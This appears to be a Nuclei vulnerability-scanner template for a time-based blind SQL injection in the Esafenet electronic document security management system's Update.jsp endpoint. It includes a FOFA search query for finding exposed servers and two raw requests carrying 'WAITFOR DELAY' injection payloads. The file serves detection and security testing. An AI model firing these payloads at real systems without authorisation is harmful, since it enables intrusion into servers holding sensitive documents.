id: esafenet_sqli_2024_update

info:
  name: 亿赛通电子文档安全管理系统 Update.jsp SQL盲注
  author: pork
  severity: high
  description: 亿赛通电子文档安全管理系统 Update.jsp 接口处存在SQL盲注。
  reference: 
  metadata:
    max-request: 2
    fofa-query: app="亿赛通-电子文档安全管理系统"
  tags: esafenet,sqli,oa,java

http:
  - raw:
      - |
        @timeout: 6s
        GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
        Host: {{Hostname}}
      - |
        @timeout: 16s
        GET /CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3);WAITFOR%20DELAY%20%270:0:16%27-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=6'
          - 'status_code_1 == 200'
          - 'contains(body_1, "sitemap>")'
        condition: and

      - type: dsl
        dsl:
          - 'duration_2>=16'
          - 'status_code_2 == 200'
          - 'contains(body_2, "sitemap>")'
        condition: and
